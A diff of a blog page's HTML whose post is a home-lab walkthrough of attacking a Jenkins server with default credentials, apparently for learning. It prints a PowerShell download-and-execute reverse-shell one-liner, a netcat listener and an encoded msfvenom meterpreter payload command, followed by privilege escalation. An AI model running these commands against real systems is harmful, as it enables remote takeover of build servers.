@@ -1,177 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="">
-<meta name="description" content="if you&amp;rsquo;ve worked in any sort of SaaS/tech company, odds are you&amp;rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &amp;ldquo;quickly&amp;rdquo; and &amp;ldquo;efficiently&amp;rdquo; (i used scare quotes because&amp;hellip;well, if you&amp;rsquo;ve worked in a software company you&amp;rsquo;ll know why). i&amp;rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access." />
-<meta name="keywords" content="" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
-<link rel="canonical" href="/posts/2022/01/jenkins/" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>jenkins</title>
+    
+<head>
+    
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>jenkins</title>
+<meta name="description" content="">
 
 
-    <title>
-        
-            jenkins ::  
-        
-    </title>
-
-
-
-
-
-<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
-    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="jenkins">
-<meta itemprop="description" content="if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access."><meta itemprop="datePublished" content="2022-01-08T14:37:40-05:00" />
-<meta itemprop="dateModified" content="2022-01-08T14:37:40-05:00" />
-<meta itemprop="wordCount" content="1077"><meta itemprop="image" content=""/>
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content=""/>
-
-<meta name="twitter:title" content="jenkins"/>
-<meta name="twitter:description" content="if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access."/>
-
-
-
-    <meta property="og:title" content="jenkins" />
-<meta property="og:description" content="if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/2022/01/jenkins/" /><meta property="og:image" content=""/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-01-08T14:37:40-05:00" />
-<meta property="article:modified_time" content="2022-01-08T14:37:40-05:00" />
-
-
-
-
-
-
-
-    <meta property="article:published_time" content="2022-01-08 14:37:40 -0500 EST" />
-
-
-
-
-
-
-
-
-
-
-
-    </head>
+<meta property="og:title" content="jenkins">
+<meta property="og:description" content="">
 
     
-        <body>
+    
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="jenkins">
+<meta name="twitter:description" content="">
+
     
     
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">></span>
-            <span class="logo__text ">
-                # cd /home/</span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#fa8072;
-                   ">
-            </span>
-        
-    </div>
-</a>
 
 
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="/about/">about</a></li><li><a href="/cv/">cv</a></li><li><a href="/posts/">posts</a></li><li><a href="/photography/">photography</a></li>
-    </ul>
-</nav>
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-  <main class="post">
-
-    <div class="post-info">
-      <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
-          <circle cx="12" cy="12" r="10"></circle>
-          <polyline points="12 6 12 12 16 14"></polyline>
-        </svg>
-        6 minutes
-
-        
-      </p>
-    </div>
-
-    <article>
-      <h1 class="post-title">
-        <a href="/posts/2022/01/jenkins/">jenkins</a>
-      </h1>
-
-      
-
-      
-
-      
-
-      <div class="post-content">
-        <p>if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.</p>
+    <base href="http://localhost:1313/">
+    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    <link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+</head>
+    <link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+</head>
+<body>
+    
+<div id="content-area" data-page-type="single">
+    <article id="post">
+        <header>
+            <h1 id="post-title">jenkins</h1>
+            <time datetime="2022-01-08T14:37:40-05:00">
+                January 8, 2022
+            </time>
+        </header>
+        <div id="post-content">
+            <p>if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.</p>
 <h2 id="the-difference-between-ci-and-cd">the difference between CI and CD</h2>
 <p><strong>CI</strong>: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.</p>
 <p><strong>CD (continuous delivery)</strong>: this is the automated delivery of completed code to environments like testing and development.</p>
 <p><strong>CD (continuous deployment)</strong>: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they&rsquo;re not constrained by regulatory or compliance requirements.</p>
-<p><img src="/CICD-DevOps.png" alt="cicd"></p>
+<p><img src="http://localhost:1313/CICD-DevOps.png" alt="cicd"></p>
 <h2 id="jenkins">jenkins</h2>
 <p>jenkins is an open-source CI/CD automation software, written in java. it&rsquo;s used to implement CI/CD workflows, called pipelines.</p>
 <p>pipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers).</p>
 <p>for this experiment, i&rsquo;ve spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM.</p>
 <p>once everything is set up, let&rsquo;s start with a simple nmap scan of the target machine.</p>
 <pre tabindex="0"><code>nmap -sT -Pn -v 10.10.77.68
-</code></pre><p><img src="/jenkins-nmap.png" alt="nmap"></p>
+</code></pre><p><img src="http://localhost:1313/jenkins-nmap.png" alt="nmap"></p>
 <p>the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i&rsquo;ll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you&rsquo;ll see a &ldquo;project&rdquo; that was created just for this experiment.</p>
-<p><img src="/jenkins-dashboard.png" alt="dashboard"></p>
+<p><img src="http://localhost:1313/jenkins-dashboard.png" alt="dashboard"></p>
 <p>since this is a windows application, i&rsquo;ll use the <a href="https://github.com/samratashok/nishang">nishang</a> repo for a script, more specifically <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">this</a> reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you&rsquo;d like.</p>
 <p>in kali, i created a directory to download the script to.</p>
 <pre tabindex="0"><code>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 </code></pre><p>now let&rsquo;s create a simple web server so that this script can be downloaded into jenkins.</p>
 <pre tabindex="0"><code>python -m SimpleHTTPServer 80
 </code></pre><p>back in jenkins, if you click &ldquo;project&rdquo; &gt; configure &gt; build, you&rsquo;ll see a command box that lets you execute any command.</p>
-<p><img src="/jenkins-build.png" alt="build"></p>
+<p><img src="http://localhost:1313/jenkins-build.png" alt="build"></p>
 <p>first, start a netcat listener in kali.</p>
 <pre tabindex="0"><code>nc -lvnp 9001
 </code></pre><p>in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.</p>
 <pre tabindex="0"><code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.9.4.75:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.75 -Port 9001
 </code></pre><p>save the build, then click &ldquo;build now&rdquo; from the project page. the netcat listener will receive a connection to the target.</p>
-<p><img src="/jenkins-netcat.png" alt="netcat"></p>
+<p><img src="http://localhost:1313/jenkins-netcat.png" alt="netcat"></p>
 <p>to make privesc easier, it&rsquo;s better to switch to a meterpreter shell.</p>
 <p>first, create an msfvenom payload in the same directory we saved the powershell script to.</p>
 <pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe
@@ -232,93 +134,13 @@ the most commonly abused privileges are:</p>
 </code></pre><p>we&rsquo;ve now migrated to an elevated process using its process ID (PID).</p>
 <p>so, there it is. we exploited jenkins to further exploit security misconfigurations to get root access on the target system. pretty cool!</p>
 
-      </div>
+        </div>
     </article>
-
-    <hr />
-
-    <div class="post-info">
-      
-      
-
-      <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
-          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
-          <polyline points="14 2 14 8 20 8"></polyline>
-          <line x1="16" y1="13" x2="8" y2="13"></line>
-          <line x1="16" y1="17" x2="8" y2="17"></line>
-          <polyline points="10 9 9 9 8 9"></polyline>
-        </svg>
-        1077 Words
-      </p>
-
-      <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
-          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-          <line x1="16" y1="2" x2="16" y2="6"></line>
-          <line x1="8" y1="2" x2="8" y2="6"></line>
-          <line x1="3" y1="10" x2="21" y2="10"></line>
-        </svg>
-        
-          2022-01-08 14:37
-        
-
-         
-          
-        
-      </p>
-    </div>
+</div>
 
     
-    <div class="pagination">
-        
-
-        <div class="pagination__buttons">
-            
-            <span class="button previous">
-                <a href="/posts/2022/10/gatekeeper-buffer-overflows/">
-                    <span class="button__icon">←</span>
-                    <span class="button__text">gatekeeper (buffer overflows)</span>
-                </a>
-            </span>
-            
-
-            
-            <span class="button next">
-                <a href="/posts/2022/01/update/">
-                    <span class="button__text">update</span>
-                    <span class="button__icon">→</span>
-                </a>
-            </span>
-            
-        </div>
-    </div>
-
-
-    
-
-    
-
-  </main>
-
-            </div>
-
-            
-                <footer class="footer">
-    
-    
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="/bundle.min.0931a358499291afca6f741478e9fc9fa973a9fbd7aeb3390f3b10463966dc8195daf98a0e33685a1fbfb9d7578631c3f31fc8e558eaf6e2c30c4c3e14df4931.js" integrity="sha512-CTGjWEmSka/Kb3QUeOn8n6lzqfvXrrM5DzsQRjlm3IGV2vmKDjNoWh&#43;/uddXhjHD8x/I5Vjq9uLDDEw&#43;FN9JMQ=="></script>
-
-
-
-    </body>
+     <script src="http://localhost:1313/p5/p5.min.js"></script>
+     <script src="http://localhost:1313/js/genart.js"></script>
+     <script src="http://localhost:1313/js/main.js"></script>
+</body>
 </html>
